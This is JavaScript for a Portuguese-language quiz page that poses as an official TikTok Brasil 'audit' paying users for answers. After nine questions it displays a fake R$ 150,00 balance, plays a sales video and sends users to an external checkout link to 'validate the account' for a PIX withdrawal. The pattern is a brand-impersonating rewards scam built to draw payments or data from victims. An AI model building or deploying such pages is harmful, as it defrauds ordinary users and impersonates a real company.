/**
 * Quiz questions and logic
 */

// Quiz questions - Foco em Auditoria Oficial TikTok Brasil
const quizQuestions = [
  {
    id: 1,
    question: "Como você avalia a precisão das recomendações de vídeos no seu feed 'Para Você' do TikTok?",
    options: [
      { emoji: "🎯", text: "Excelente, acerta sempre o que eu gosto" },
      { emoji: "👍", text: "Bom, mas ainda aparecem temas aleatórios" },
      { emoji: "🔄", text: "Mostra muitos vídeos repetidos ou antigos" },
      { emoji: "👎", text: "Pouco relevante para as minhas preferências" }
    ]
  },
  {
    id: 2,
    question: "Ao navegar pelo TikTok, qual problema mais prejudica sua experiência e faz você fechar o aplicativo?",
    options: [
      { emoji: "📺", text: "Excesso de propagandas e anúncios chatos" },
      { emoji: "⏳", text: "Vídeos travando ou demorando a carregar" },
      { emoji: "🤖", text: "Perfis falsos, spam e bots nos comentários" },
      { emoji: "🔋", text: "Consumo excessivo de bateria do celular" }
    ]
  },
  {
    id: 3,
    question: "Qual o principal motivo que faz você pular um vídeo nos primeiros 3 segundos de exibição?",
    options: [
      { emoji: "🔈", text: "Áudio baixo, estourado ou narração irritante" },
      { emoji: "🥱", text: "Início enrolado e sem prender a atenção" },
      { emoji: "📱", text: "Qualidade de imagem ruim ou fora de foco" },
      { emoji: "🛑", text: "Conteúdo com clickbait enganoso" }
    ]
  },
  {
    id: 4,
    question: "Em relação aos anúncios e produtos da 'TikTok Shop' ou lives de vendas, qual é a sua percepção?",
    options: [
      { emoji: "🛍️", text: "Acho interessante e já comprei ou compraria" },
      { emoji: "⚠️", text: "Tenho receio de segurança nas compras" },
      { emoji: "📈", text: "Aparecem muitas promoções repetitivas" },
      { emoji: "❌", text: "Prefiro apenas vídeos de entretenimento" }
    ]
  },
  {
    id: 5,
    question: "Com que frequência você encontra perfis falsos, golpes financeiros ou bots nas transmissões ao vivo (Lives)?",
    options: [
      { emoji: "🛡️", text: "Raramente, a moderação parece rápida" },
      { emoji: "👀", text: "Às vezes, principalmente em lives grandes" },
      { emoji: "⚠️", text: "Com frequência, precisa de mais fiscalização" },
      { emoji: "🚨", text: "Quase sempre encontro bots e golpes" }
    ]
  },
  {
    id: 6,
    question: "Como você avalia a estabilidade do TikTok durante grandes transmissões ao vivo e eventos esportivos?",
    options: [
      { emoji: "⚡", text: "Muito estável, funciona sem interrupções" },
      { emoji: "🐢", text: "Fica lento ou perde qualidade do vídeo" },
      { emoji: "📵", text: "Já presenciei travamento ou encerramento" },
      { emoji: "🤷", text: "Não costumo assistir lives longas" }
    ]
  },
  {
    id: 7,
    question: "Para o programa oficial de recompensas de auditores, qual melhoria de pagamento você considera mais importante?",
    options: [
      { emoji: "⚡", text: "Liberação de saque PIX instantâneo na conta" },
      { emoji: "💵", text: "Maior remuneração em dinheiro por avaliação" },
      { emoji: "🎁", text: "Bônus diário cumulativo para avaliadores fiéis" },
      { emoji: "🏆", text: "Premiação extra no ranking mensal" }
    ]
  },
  {
    id: 8,
    question: "Qual recurso exclusivo você mais gostaria de ver integrado ao TikTok neste ano?",
    options: [
      { emoji: "🔍", text: "Busca inteligente por voz e músicas em alta" },
      { emoji: "🎬", text: "Filtros de IA avançados e ferramentas de edição" },
      { emoji: "🔒", text: "Maior controle de privacidade e segurança" },
      { emoji: "💬", text: "Melhorias nos chats diretos e comentários" }
    ]
  },
  {
    id: 9,
    question: "Para finalizar sua auditoria: Qual melhoria é URGENTE para o TikTok manter sua liderança no Brasil?",
    options: [
      { emoji: "🛡️", text: "Tolerância zero a perfis falsos e fraudes" },
      { emoji: "🔋", text: "Modo econômico leve para bateria e dados" },
      { emoji: "⚡", text: "Carregamento instantâneo em qualquer conexão" },
      { emoji: "💰", text: "Mais incentivo e premiações aos usuários ativos" }
    ]
  }
];


// Quiz state
let currentQuestionIndex = 0;
let selectedOption = null;
let isProcessing = false;
let autoAdvanceTimer = null;
const quizContainer = document.getElementById('quiz-container');
const checkoutUrl = 'https://ambieenteseguro.site/f/sp6btgug2p';

// Render a question
function renderQuestion(questionIndex) {
  const question = quizQuestions[questionIndex];
  selectedOption = null;
  isProcessing = false;
  if (autoAdvanceTimer) {
    clearTimeout(autoAdvanceTimer);
    autoAdvanceTimer = null;
  }
  
  // Update progress
  updateProgressBar(questionIndex, quizQuestions.length);
  
  // Create the question HTML
  const questionHTML = `
    <div class="quiz-question-wrap">
      <div class="quiz-question-icon">📊</div>
      <h2 class="quiz-title">${question.question}</h2>
      <p class="quiz-subtitle">Selecione uma opção para continuar:</p>
    </div>
    
    <div class="options-container">
      ${question.options.map((option, index) => `
        <div class="option" data-index="${index}">
          <div class="option-content">
            <div class="option-emoji">${option.emoji}</div>
            <div class="option-text">${option.text}</div>
          </div>
          <div class="custom-checkbox"></div>
        </div>
      `).join('')}
    </div>
    
    <div class="continue-btn-wrap">
      <button id="continue-btn" class="continue-btn" disabled>Continuar</button>
    </div>
    
    <div class="bonus-strip" id="bonus-strip-btn">
      <div class="bonus-strip-icon">🎁</div>
      <div class="bonus-strip-text">
        <h4>Concorra a um bônus adicional</h4>
        <p>Quanto mais você interage, maiores as chances</p>
      </div>
      <div class="bonus-strip-arrow">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
      </div>
    </div>
  `;
  
  // Set the HTML
  quizContainer.innerHTML = questionHTML;
  
  const continueBtn = document.getElementById('continue-btn');
  const bonusStrip = document.getElementById('bonus-strip-btn');

  function triggerAdvance() {
    if (selectedOption === null) return;
    if (continueBtn && continueBtn.dataset.clicked === 'true') return;
    if (continueBtn) {
      continueBtn.dataset.clicked = 'true';
    }
    showReward(currentQuestionIndex);
  }

  // Add event listeners to options
  const options = document.querySelectorAll('.option');
  options.forEach(option => {
    option.addEventListener('click', () => {
      // Remove selection from all options
      options.forEach(opt => opt.classList.remove('selected'));

      // Select this option (permite trocar a resposta antes de continuar)
      option.classList.add('selected');

      // Store the selected option
      selectedOption = parseInt(option.dataset.index);

      // Enable continue button — a recompensa só aparece ao clicar em "Continuar"
      if (continueBtn) {
        continueBtn.disabled = false;
      }
    });
  });
  
  // Add event listener to continue button
  if (continueBtn) {
    continueBtn.addEventListener('click', function(e) {
      e.stopPropagation();
      triggerAdvance();
    });
  }

  if (bonusStrip) {
    bonusStrip.addEventListener('click', function() {
      if (selectedOption !== null) {
        triggerAdvance();
      }
    });
  }
  
  // Animate the new question in
  animateElement(quizContainer, 'slide-in');
}

// Move to the next question
function nextQuestion() {
  currentQuestionIndex++;
  selectedOption = null;
  isProcessing = false;
  if (autoAdvanceTimer) {
    clearTimeout(autoAdvanceTimer);
    autoAdvanceTimer = null;
  }
  
  if (currentQuestionIndex < quizQuestions.length) {
    renderQuestion(currentQuestionIndex);
  } else {
    // Show final reward
    showFinalReward();
  }
}

// Reset the quiz
function resetQuiz() {
  currentQuestionIndex = 0;
  selectedOption = null;
  totalEarned = 0;
  rewards = generateRewards();
  currentBalance.textContent = "0,00";
  renderQuestion(currentQuestionIndex);
}

// Show final reward and checkout
function showFinalReward() {
  selectedOption = null;
  isProcessing = false;

  const finalHTML = `
    <div class="quiz-final-wrap">
      <div class="quiz-question-icon">🏆</div>
      <h2 class="quiz-title">Auditoria Concluída!</h2>
      <p class="quiz-subtitle">Assista ao vídeo abaixo para liberar seu saque:</p>
      
      <div class="vsl-container" style="width: 100%; margin: 20px 0; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.2)">
        <video id="vsl-video" controls autoplay style="width: 100%; display: block;">
          <source src="vsl.mp4" type="video/mp4">
          Seu navegador não suporta vídeos.
        </video>
      </div>

      <div class="final-reward-card">
        <div class="reward-value">R$ 150,00</div>
        <div class="reward-label">Saldo Disponível para Saque</div>
      </div>

      <div class="continue-btn-wrap">
        <button id="checkout-btn" class="continue-btn">Resgatar Recompensa Agora</button>
      </div>
      
      <p class="quiz-footer-text">Clique no botão acima para validar sua conta e realizar o saque via PIX.</p>
    </div>
  `;

  quizContainer.innerHTML = finalHTML;
  animateElement(quizContainer, 'slide-in');

  const checkoutBtn = document.getElementById('checkout-btn');
  if (checkoutBtn) {
    checkoutBtn.addEventListener('click', () => {
      window.location.href = checkoutUrl;
    });
  }
}
